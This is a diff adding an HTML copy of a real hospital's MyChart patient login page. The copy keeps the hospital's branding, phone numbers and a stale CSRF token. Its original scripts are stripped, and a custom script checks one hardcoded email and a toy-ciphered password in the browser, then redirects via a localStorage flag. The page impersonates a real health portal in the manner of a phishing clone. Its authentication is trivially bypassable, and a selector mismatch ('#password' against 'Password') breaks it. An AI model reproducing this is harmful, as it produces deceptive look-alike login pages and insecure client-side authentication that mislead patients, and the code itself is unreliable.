@@ -1,0 +1,514 @@
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en" dir="ltr" class="notile"
+    style="--wp-header-height: 0px; --wp-main-padding-top: 8.66667px; --wp-footer-height: 73.6094px;">
+
+<head>
+    <title>MyChart - Login Page</title>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta property="og:title" content="MyChart - Login Page">
+    <meta property="og:image" content="mychart/en-US/images/MyChart_city.png">
+    <meta name="format-detection" content="telephone=no">
+    <noscript>
+        <meta http-equiv="refresh" content="0;url=mychart/nojs.asp" />
+    </noscript>
+
+
+    <link rel="icon" href="mychart/en-us/images/favicon.ico" type="image/x-icon">
+    <link type="text/css" rel="stylesheet" media="All" href="mychart/en-us/styles/common.css?updateDt=1711130159">
+    <link type="text/css" rel="stylesheet" media="All" href="mychart/en-us/styles/prelogin.css?updateDt=1711130174">
+    <link type="text/css" rel="stylesheet" media="All" href="mychart/en-us/styles/menu.css?updateDt=1711130163">
+    <link type="text/css" rel="stylesheet" media="All" href="mychart/en-us/styles/component.css?updateDt=1711130159">
+    <link type="text/css" rel="stylesheet" media="All" href="mychart/en-us/styles/colors.css?updateDt=1711130159">
+    <link type="text/css" rel="stylesheet" media="All" href="mychart/en-us/styles/themes.css?updateDt=1711130178">
+    <link type="text/css" rel="stylesheet" media="All"
+        href="mychart/en-us/styles/externalcolors.css?updateDt=1481729100">
+    <link type="text/css" rel="stylesheet" media="All" href="mychart/en-us/styles/calendars.css?updateDt=1711130158">
+    <link type="text/css" rel="alternate stylesheet" media="All"
+        href="mychart/en-us/styles/highcontrast.css?updateDt=1711130162" disabled="" title="High Contrast">
+
+    <link href="mychart/en-US/styles/bundles/sdk?v=Nld2ShYtakR98bVCe0PudijTUJcaA0cDX3RGgR6qgWY1" rel="stylesheet">
+
+
+
+
+    <!-- Include responsive resources when appropriate -->
+    <meta name="viewport" content="initial-scale=1, width=device-width">
+    <link type="text/css" rel="stylesheet" media="All"
+        href="mychart/en-us/styles/mobile_responsivesite.css?updateDt=1711130164">
+    <link type="text/css" rel="stylesheet" media="All"
+        href="mychart/en-us/styles/goo-grid/goo-grid.css?updateDt=1711130161">
+    <link type="text/css" rel="stylesheet" media="All"
+        href="mychart/en-us/styles/mobile_gridadapter.css?updateDt=1711130163">
+
+    <link type="text/css" rel="stylesheet" media="All"
+        href="mychart/en-us/styles/bshsi-cssoverride.css?updateDt=1538073432">
+    <link type="text/css" rel="stylesheet" media="Print" href="mychart/en-us/styles/print.css?updateDt=1711130174">
+
+
+    <!--anti click-jacking script-->
+
+    <script nonce="" type="text/javascript">
+        if (self === top) {
+            var InitialBodyClass = document.getElementById("initialBodyClass");
+            if (InitialBodyClass) {
+                InitialBodyClass.parentNode.removeChild(InitialBodyClass);
+            }
+        }
+        else {
+            top.location = "mychart/Home/LogOut";
+        }
+    </script>
+    <!--end anti click-jacking script-->
+    <script nonce="" type="application/ld+json">
+    {
+        "@context" : "https://schema.org",
+        "@type" : "WebSite",
+        "name" : "Bon Secours Mercy Health O.H.C.A.",
+        "url" : "https://ce-prd.mercy.com/msmq/ce-prd"
+    }
+    </script>
+
+    <script nonce="" type="text/javascript">
+        if (typeof WP === 'undefined') {
+            WP = {};
+        }
+        WP.myPath = 'mychart/';
+    </script>
+    <style type="text/css">
+        @font-face {
+            font-weight: 400;
+            font-style: normal;
+            font-family: circular;
+
+            src: url('chrome-extension://liecbddmkiiihnedobmlmillhodjkdmb/fonts/CircularXXWeb-Book.woff2') format('woff2');
+        }
+
+        @font-face {
+            font-weight: 700;
+            font-style: normal;
+            font-family: circular;
+
+            src: url('chrome-extension://liecbddmkiiihnedobmlmillhodjkdmb/fonts/CircularXXWeb-Bold.woff2') format('woff2');
+        }
+    </style>
+</head>
+
+<body class="loginPage isPrelogin hasNoCommunityLinks color1 md_login_login ready" cz-shortcut-listen="true">
+
+    <div id="jsdisabled" class="overlay" style="display: none;">
+        <div class="lightbox_overlay"></div>
+        <div class="jsdisabled">
+            <p><span class="clearlabel">Error: </span>Please enable JavaScript in your browser before using this site.
+            </p>
+        </div>
+        <script nonce="" type="text/javascript">document.getElementById('jsdisabled').style.display = 'none';</script>
+    </div>
+    <div id="appPopupRoot" class="overlayContainer"></div>
+    <div id="classicPopupRoot" class="overlayContainer">
+        <div id="onboarding-content" class="jqHidden"></div>
+        <div id="lightbox" class="lb_content jqHidden"></div>
+        <div id="lightbox_overlay" class="lightbox_overlay lb_overlay jqHidden"
+            csp-guid-click="bf7fc08daed34409bd313929df0ff8a9"></div>
+    </div>
+
+
+
+
+    <div id="wrap" data-hide-during-popup="true">
+        <div class="hidden" id="__CSRFContainer"><input name="__RequestVerificationToken" type="hidden"
+                value="l5BH_vyWf4jSxBEkZjbFuyeTOcM9Nh1ujEd5J-2BhpVssoQ-6A3ms0aS44MA8TYY2dbcwBthV8AIE7zU4mR3CIbETkw1"
+                autocomplete="off"></div>
+
+
+
+
+        <div id="toastWrapper" class="fitme width animToast" role="status" aria-live="polite" aria-atomic="true"></div>
+        <div id="content" class="hasSidebar">
+            <main id="main"><a name="maintop" id="maintop"></a><a href="mychart/" class="logo" title=""
+                    aria-label="MyChart - Your secure online health connection"></a>
+                <div id="LoginNoCookies">
+                    <div id="noCookies" class="noCookies jqHidden">
+                        <div class="verticalCenter">
+                            <div class="icon"></div>
+                            <div>
+                                <p id="noCookiesButtonContainer"><a href="#" target="_top" id="noCookiesButton"
+                                        role="button" class="button">Sign in to MyChart</a></p>
+                            </div>
+                        </div>
+                    </div>
+                    <div id="noCookiesError" class="noCookies jqHidden">
+                        <div class="verticalCenter">
+                            <div class="icon"></div>
+                            <div><span><span class="clearlabel">Error: </span>Please <a href="mychart/Help/Cookies"
+                                        target="_blank">enable cookies</a> to log in to MyChart.
+                                </span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="mainLoginContent beforeLoginFields">
+                    <div class="mainLoginContentBody">
+                        <div class="featuresGridWrapper grid insulated">
+                            <ul class="features row">
+                                <li class="icon-caution col-6"
+                                    style="width: 100%; background-image: url('mychart/en-US/images/quicklinks/info.png');">
+                                    <h2 class="header">Welcome to Your New MyChart Site!</h2><span class="info"
+                                        <p="">Through MyChart you will be able to access personal health information -
+                                        including upcoming appointments, test results and more.<p></p>
+                                        <p>If you experience any issues logging in, click <i>Forgot Username</i> or
+                                            <i>Forgot Password</i> and verify your personal information to retrieve your
+                                            information or call our Help Desk at 866-385-7060.
+                                        </p>
+                                    </span>
+                                </li>
+                            </ul>
+                        </div>
+                        <!-- <div class="featuresGridWrapper grid insulated">
+                            <ul class="features row">
+                                <li class="icon-advice col-6">
+                                    <h2 class="header">Communicate with your doctor</h2><span class="info">Get answers
+                                        to your medical questions from the comfort of your own home</span>
+                                </li>
+                                <li class="icon-testResults col-6">
+                                    <h2 class="header">Access your test results</h2><span class="info">No more waiting
+                                        for a phone call or letter – view your results and your doctor's comments within
+                                        days</span>
+                                </li>
+                                <li class="icon-medications col-6">
+                                    <h2 class="header">Request prescription refills</h2><span class="info">Send a refill
+                                        request for any of your refillable medications</span>
+                                </li>
+                                <li class="icon-calendar col-6">
+                                    <h2 class="header">Manage your appointments</h2><span class="info">Schedule your
+                                        next appointment, or view details of your past and upcoming appointments</span>
+                                </li>
+                            </ul>
+                        </div> -->
+                    </div>
+                </div>
+                <div id="appRoot" class="section"></div>
+            </main>
+
+
+            <aside id="sidebar">
+                <div id="locale_container" class="prelogin">
+                    <div id="localeswitch"><a lang="es-US" class="morelocalesitemlink" href="#"><span lang="es-US"
+                                class="localename">Ver en Español</span><abbr class="abbreviatedname"
+                                title="Ver en Español">
+                                Esp
+                            </abbr></a></div>
+                </div>
+                <div class="loginAlerts">
+                    <div class="errorMessage" id="loginErrorMessage"><span class="alert card hidden "><img
+                                id="WarningIcon" alt="" src="mychart/en-US/images/warning.png"><span
+                                id="errorMessage"></span></span></div>
+                </div>
+                <div class="login">
+                    <form autocomplete="off" method="post" action="#" id="loginForm" target="_top">
+                        <div class="formcontents"><input class="hidden" type="hidden" id="jsenabled" name="jsenabled"
+                                value="0" autocomplete="off">
+                            <div class=" compact"><label for="Login">MyChart Username</label><input
+                                    data-permissive="true" class="jsreq" type="text" id="userName" name="Login"
+                                    maxlength="128" autocomplete="off" aria-describedby="errorMessage"></div>
+                            <div class=""><label for="Password">Password</label><input class="jsreq" type="password"
+                                    id="Password" name="Password" autocomplete="off" aria-describedby="errorMessage">
+                            </div><input class="button tall jsreq completeworkflow" type="button" onclick="login()"
+                                name="submit" id="submit" value="Sign in" title="" autocomplete="off">
+                            <div class="recovery"><a href="mychart/recoverlogin.asp">Forgot username?</a><a
+                                    href="mychart/passwordreset.asp">Forgot password?</a></div>
+                            <div id="invisibleCaptchaContainer" class="loginCaptcha"></div>
+                        </div>
+                    </form>
+                    <form class="hidden" action="mychart/Authentication/Login/DoLogin" autocomplete="off"
+                        id="actualLogin" method="post" target="_top"><input name="__RequestVerificationToken"
+                            type="hidden"
+                            value="l5BH_vyWf4jSxBEkZjbFuyeTOcM9Nh1ujEd5J-2BhpVssoQ-6A3ms0aS44MA8TYY2dbcwBthV8AIE7zU4mR3CIbETkw1"
+                            autocomplete="off">
+                        <div class="formcontents">
+                        </div><input type="hidden" name="DeviceId"><input type="hidden" name="postLoginUrl" value="">
+                    </form>
+                </div>
+                <div class="signup">
+                    <h2 class="header center">New User?</h2><a class="button tall newworkflow" role="button"
+                        href="mychart/accesscheck.asp">Sign up now</a>
+                </div>
+                <p class="posttext"><br></p>
+                <div><a class="button tall guestpay" style="role=&quot;button&quot;"
+                        href="../billing/guestpay/payasguest">Pay As Guest</a></div><br>
+                <p>Have a MyChart Question?<br> Call: 866-385-7060</p>
+                <p></p>
+                <div class="mainLoginContent afterLoginFields"></div>
+            </aside>
+
+
+            <footer id="footer">
+                <div id="mainFooter" class="mainStyle">
+                    <div class="badges sm-alignCenter"><a
+                            href="https://itunes.apple.com/us/appmychart/id382952264?mt=8"><img
+                                src="mychart/en-US/images/badge_apple.png" alt="MyChart for iOS" class="badge"></a><a
+                            href="https://play.google.com/store/apps/details?id=epic.mychart.android&amp;hl=en"><img
+                                src="mychart/en-US/images/badge_android.png" alt="MyChart for Android"
+                                class="badge"></a></div>
+                    <div class="links alignEnd sm-alignCenter"><a
+                            href="https://open.epic.com/Tutorial/PatientAuthentication?whereFrom=MyChart">Interoperability
+                            Guide</a><a href="mychart/Authentication/Login?mode=stdfile&amp;option=faq">FAQs</a><a
+                            href="mychart/Authentication/Login?mode=stdfile&amp;option=hlthprivacy">Privacy Policy</a><a
+                            href="mychart/Authentication/Login?mode=stdfile&amp;option=termsandconditions">Terms and
+                            Conditions</a><a href="#" class="cssSwitcher" data-csstitle="Default">Default Theme</a><a
+                            href="#" class="cssSwitcher" data-csstitle="High Contrast">High Contrast Theme</a>
+                        <div id="Customizable"><a href="..\BSHSI\docs\en-US\ProxyRequestform.pdf" target="_blank">Proxy
+                                Verification Form</a></div>
+                    </div>
+                </div>
+                <div id="sidebarFooter" class="sidebarStyle">
+                    <div id="mychart_by_epic_logo_wrapper"
+                        style="display: block !important; visibility: visible !important; opacity: 1 !important; min-height: 1rem !important; padding: 0px !important; margin: 0.5rem auto 0px !important; min-width: 6.5rem !important; width: 6.5rem !important; position: static !important; z-index: auto !important;">
+                        <img id="mychart_by_epic_logo" src="mychart/en-US/images/MyChartByEpic_inline_dark.svg"
+                            alt="MyChart by Epic"
+                            style="display: block !important; visibility: visible !important; opacity: 1 !important; min-height: 1rem !important; padding: 0px !important; margin: 0.5rem auto 0px !important; min-width: 6.5rem !important; width: 6.5rem !important; position: static !important; z-index: auto !important;">
+                    </div>
+                    <div class="copyright" lang="en"><a target="_top"
+                            href="mychart/Authentication/Login?mode=stdfile&amp;option=epiccopyright"><span
+                                class="copystring">MyChart® licensed from Epic Systems Corporation</span><span
+                                class="copyyear">© 1999 - 2024</span></a></div>
+                </div>
+            </footer>
+        </div>
+    </div>
+    <!-- <div id="_coreScripts" class="hidden">
+        <script src="mychart/scripts/external/jquery-3.6.0.min.js?updateDt=1642255120" type="text/javascript"></script>
+        <script src="mychart/scripts/utilities/jqwrappers.min.js?updateDt=1631942874" type="text/javascript"></script>
+        <script src="mychart/scripts/utilities/jqueryextensions.min.js?updateDt=1612582210"
+            type="text/javascript"></script>
+        <script src="mychart/scripts/external/handlebars.runtime.min.js?updateDt=1517453058"
+            type="text/javascript"></script>
+        <script src="mychart/scripts/external/js-joda.min.js?updateDt=1666383764" type="text/javascript"></script>
+        <script src="mychart/scripts/external/js-joda-timezone.min.js?updateDt=1666383764"
+            type="text/javascript"></script>
+        <script src="mychart/bundles/core-1-pre?v=qWbQz78ERFHMfUclWhI71agy8TJMhGW4b-njpycosCI1"></script>
+
+        <script src="mychart/scripts/ui_framework/core/uiframeworkbindings.min.js?updateDt=1645570202"
+            type="text/javascript"></script>
+        <script src="mychart/debug/debugsettings?updateDt=273256729" type="text/javascript"></script>
+        <script src="mychart/localization/formats?lang=en-us&amp;updateDt=273256729" type="text/javascript"></script>
+        <script src="mychart/context/webserversettings?updateDt=273256729" type="text/javascript"></script>
+        <script src="mychart/bundles/core-2-en-US?v=hJjobr0MF0HZigQpdOuPrVzq-EDGhP5BUGFotiSz_7s1"></script>
+
+        <script src="mychart/mnemonics?updateDt=273256729" type="text/javascript"></script>
+        <script src="mychart/bundles/core-3-en-US?v=Azh7enGZaRd7bOGKiuuXgloZYF0g-X-VBzA7mP8uJc01"></script>
+
+        <script src="mychart/bundles/core-4-header?v=G1yNijabxQp1mK8gx52TPt0PdkdFCNhFJk9IVrYor9Y1"></script>
+
+        <script nonce="" type="text/javascript">
+            $$WP.I18N.AllLocales = $$WP.I18N.Locale.createModelCollection();
+            $$WP.I18N.Locale.convertRawLocales({ "es-US": { "Direction": 1, "Language": "ES", "ForceMetricUnits": false, "PrimaryLocaleName": "en-US", "DateSeparator": "/", "TimeSeparator": ":", "Is24HourTime": false, "FirstDayOfTheWeek": 1, "DecimalSeparator": ".", "GroupSeparator": ",", "RangeSeparator": " - ", "DecimalPlaces": "2", "GroupSize": "3", "NegativePattern": "-n", "CurrencySymbol": "$", "CurrencyCode": "USD", "CurrencyDecimalPlaces": "2", "CurrencyGroupSize": "3", "CurrencyPositivePattern": "$n", "CurrencyNegativePattern": "-$n", "PercentSymbol": "%", "ListSeparator": ",", "ListSpaces": 1 }, "en-US": { "Direction": 1, "Language": "EN", "ForceMetricUnits": false, "PrimaryLocaleName": "en-US", "DateSeparator": "/", "TimeSeparator": ":", "Is24HourTime": false, "FirstDayOfTheWeek": 1, "DecimalSeparator": ".", "GroupSeparator": ",", "RangeSeparator": " - ", "DecimalPlaces": "2", "GroupSize": "3", "NegativePattern": "-n", "CurrencySymbol": "$", "CurrencyCode": "USD", "CurrencyDecimalPlaces": "2", "CurrencyGroupSize": "3", "CurrencyPositivePattern": "$n", "CurrencyNegativePattern": "-$n", "PercentSymbol": "%", "ListSeparator": ",", "ListSpaces": 1 } }, $$WP.I18N.AllLocales);
+            var locale = $$WP.I18N.getMyChartLocale();
+            var tmp = $$WP.I18N.AllLocales.getFromIndex('Identifier', locale);
+            if (tmp === null) { $$WP.Debug.logError('Unable to load locale "' + locale + '" from $$WP.I18N.AllLocales.'); tmp = new $$WP.I18N.Locale(); }
+            $$WP.CurrentLocale = tmp.toRawObject();
+        </script>
+
+        <script src="mychart/bundles/core-5-en-US?v=LauoxGbD8GoKKx9Ocvcwd0giwrG293v-F_mpJv627Ac1"></script>
+
+        <script nonce="" type="text/javascript">
+            if (typeof $$WP === 'undefined') { $$WP = {}; }
+            $$WP.Settings = $$WP.Settings || {};
+            $$WP.Settings.WebsiteUrl = 'mychart/';
+            $$WP.Settings.PublicDomain = 'https://mychart.bonsecours.com';
+        </script>
+
+
+        <script src="mychart/react/corescripts?updateDt=273256729" type="text/javascript"></script> -->
+
+    </div>
+    <div id="_templates" class="hidden">
+
+    </div>
+    <div id="_scripts">
+        <!-- 
+        <script src="mychart/areas/authentication/scripts/controllers/loginpagecontroller.min.js?updateDt=1707873062"
+            type="text/javascript"></script>
+        <script nonce="" type="text/javascript">
+            $$WP.Utilities.UI.OnUIFrameworkLoaded(function () {
+                var fullDataTileAutoFocusUsernameField = true;
+                var captchaRequired = false;
+                new $$WP.Authentication.Login.Controllers.LoginController(fullDataTileAutoFocusUsernameField, captchaRequired);
+            });
+        </script>
+
+        <script nonce="" type="text/javascript">(function () {
+                window.addEventListener('load', function (event) { WP.DOM.Browser.checkClearCache(); WP.DOM.Browser.checkBrowserSupported(); $$WP.CommunityUtilities.checkIfCommunityLinksAvailable(); setClientTimeZone(); jumpToAnchor(); });
+                $afe.select('[csp-guid-click="bf7fc08daed34409bd313929df0ff8a9"]').on('click', function (event) { $$WP.Utilities.HideLightbox(this); });
+            })();
+        </script> -->
+    </div>
+    <div id="_models" class="hidden">
+
+    </div>
+    <div id="_controllers" class="hidden">
+
+    </div>
+    <div id="_resources" class="hidden">
+
+    </div>
+    <div id="_authentication" class="hidden">
+
+    </div>
+    <!-- 
+    <div id="__PerformanceTrackingSettings" class="hidden"><input name="__NavigationRequestMetrics"
+            value="[&quot;WP-24MBjNRvEydYRdIajtOk4UC6aT5PfpO4LSByJlhYUkoUZLJ95-2Fr12RLEc-2B7lZATBkr9MnMGog0s-2BDG-2F2fqz4xF-2F6QMHpiszPf8B8WJ-2BrZjgao0xKfZtDjQii99I8-2FfgO0Q2rcxaPg2RmurieAOG0lKsB5hd4coOlmJqOSRissTe2y3lJd8A0vdFmIwj1Qi-2FJn7daPeFcBwqoGJ27wbOPsL9T8zvZdyll978OBwdFwWm4EFnXWi5AEHjRDEofJp1feBdQJ7FeXu92Ky9-2BGMUncI7X1gymyveNbey4KiV654430-3D-24BafH9DRj6dFFNQySG62WA7tkZYJtqW3W9ihZ2ILmCu8-3D&quot;]"
+            type="hidden" autocomplete="off"><input name="__NavigationRedirectMetrics" value="[]" type="hidden"
+            autocomplete="off"><input name="__RedirectChainIncludesLogin" value="0" type="hidden"
+            autocomplete="off"><input name="__CurrentPageLoadDescriptor" value="" type="hidden"
+            autocomplete="off"><input name="__RttCaptureEnabled" value="1" type="hidden" autocomplete="off"></div>
+
+
+    <script id="f5_cspm">(function () {
+            var f5_cspm = {
+                f5_p: 'PGANNFEJHNJMJCMKJBDHJFGHJJGGDICFLCAHCPDDCHICAOPLJOPGPBBDDCFMPLNIAPDBFOKAAAMMKIHHMADAGGABAAHPOKFHMDMLFMCLLOMMMLLGJLOMCHNABMNAILJI', setCharAt: function (str, index, chr) { if (index > str.length - 1) return str; return str.substr(0, index) + chr + str.substr(index + 1); }, get_byte: function (str, i) { var s = (i / 16) | 0; i = (i & 15); s = s * 32; return ((str.charCodeAt(i + 16 + s) - 65) << 4) | (str.charCodeAt(i + s) - 65); }, set_byte: function (str, i, b) { var s = (i / 16) | 0; i = (i & 15); s = s * 32; str = f5_cspm.setCharAt(str, (i + 16 + s), String.fromCharCode((b >> 4) + 65)); str = f5_cspm.setCharAt(str, (i + s), String.fromCharCode((b & 15) + 65)); return str; }, set_latency: function (str, latency) { latency = latency & 0xffff; str = f5_cspm.set_byte(str, 40, (latency >> 8)); str = f5_cspm.set_byte(str, 41, (latency & 0xff)); str = f5_cspm.set_byte(str, 35, 2); return str; }, wait_perf_data: function () {
+                    try {
+                        var wp = window.performance.timing; if (wp.loadEventEnd > 0) {
+                            var res = wp.loadEventEnd - wp.navigationStart; if (res < 60001) { var cookie_val = f5_cspm.set_latency(f5_cspm.f5_p, res); window.document.cookie = 'f5avr0073766933aaaaaaaaaaaaaaaa_cspm_=' + encodeURIComponent(cookie_val) + ';path=/'; }
+                            return;
+                        }
+                    }
+                    catch (err) { return; }
+                    setTimeout(f5_cspm.wait_perf_data, 100); return;
+                }, go: function () {
+                    var chunk = window.document.cookie.split(/\s*;\s*/); for (var i = 0; i < chunk.length; ++i) {
+                        var pair = chunk[i].split(/\s*=\s*/); if (pair[0] == 'f5_cspm' && pair[1] == '1234') { var d = new Date(); d.setTime(d.getTime() - 1000); window.document.cookie = 'f5_cspm=;expires=' + d.toUTCString() + ';path=/;'; setTimeout(f5_cspm.wait_perf_data, 100); }
+                    }
+                }
+            }
+            f5_cspm.go();
+        }());</script> -->
+
+
+    <!-- <div role="alert" class="ajaxspinner defaultajaxoverlay hidden">
+        <div class="loadingmessage">Loading...<div class="loadingHeart"></div>
+        </div>
+    </div>
+    <div id="loom-companion-mv3" ext-id="liecbddmkiiihnedobmlmillhodjkdmb">
+        <section id="shadow-host-companion"></section>
+    </div> -->
+
+
+
+    <script>
+
+
+
+        function getLetterFromAlphabetForLetter(letter, letterToChange) {
+            // this is the alphabet we know, plus numbers and the = sign 
+            const abc = 'abcdefghijklmnopqrstuvwxyz0123456789=ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+
+            // get the position of the given letter, according to our abc
+            const posLetter = abc.indexOf(letter);
+
+            // if we cannot get it, then we can't continue
+            if (posLetter == -1) {
+                console.log('Password letter ' + letter + ' not allowed.');
+                return null;
+            }
+            // according to our abc, get the position of the letter to encrypt
+            const posLetterToChange = abc.indexOf(letterToChange);
+
+            // again, if any error, we cannot continue...
+            if (posLetterToChange == -1) {
+                console.log('Password letter ' + letter + ' not allowed.');
+                return null;
+            }
+
+            // let's build the new abc. this is the important part
+            const part1 = abc.substring(posLetter, abc.length);
+            const part2 = abc.substring(0, posLetter);
+            const newABC = '' + part1 + '' + part2;
+
+            // we get the encrypted letter
+            const letterAccordingToAbc = newABC.split('')[posLetterToChange];
+
+            // and return to the routine...
+            return letterAccordingToAbc;
+        }
+
+        function encrypt(password, text) {
+
+            // move text to base64 so we avoid special chars
+            const base64 = btoa(text);
+
+            // text string to array
+            const arr = base64.split('');
+            // array of password
+            const arrPass = password.split('');
+            let lastPassLetter = 0;
+
+            // encrypted string
+            let encrypted = '';
+
+            // encrypt
+            for (let i = 0; i < arr.length; i++) {
+
+                const letter = arr[i];
+
+                const passwordLetter = arrPass[lastPassLetter];
+
+                const temp = getLetterFromAlphabetForLetter(
+                    passwordLetter, letter);
+
+                if (temp) {
+                    // concat to the final response encrypted string
+                    encrypted += temp;
+                } else {
+                    // if any error, return null
+                    return null;
+                }
+
+                /*
+                  This is important: if we're out of letters in our 
+                  password, we need to start from the begining.
+                */
+                if (lastPassLetter == (arrPass.length - 1)) {
+                    lastPassLetter = 0;
+                } else {
+                    lastPassLetter++;
+                }
+            }
+
+            // We finally return the encrypted string
+            return encrypted;
+        }
+
+        function login() {
+
+            const userName = document.querySelectorAll('#userName')[0].value
+            const password = document.querySelectorAll('#password')[0].value
+
+
+            const encryptedPassword = encrypt(password, "!@#$");
+
+            if (userName == 'gordon.carroll@icloud.com' && encryptedPassword == "i23nYTDL") {
+
+
+                alert("login succesfully")
+
+
+                const user = localStorage.setItem('user', true);
+
+                window.location.replace("./dashboard.html");
+
+            } else {
+                alert("Incorrect login credentials")
+            }
+
+        }
+
+
+        const user = localStorage.getItem('user');
+
+        if (user) {
+            window.location.replace("./dashboard.html");
+        }
+
+    </script>
+</body>
+
+</html>
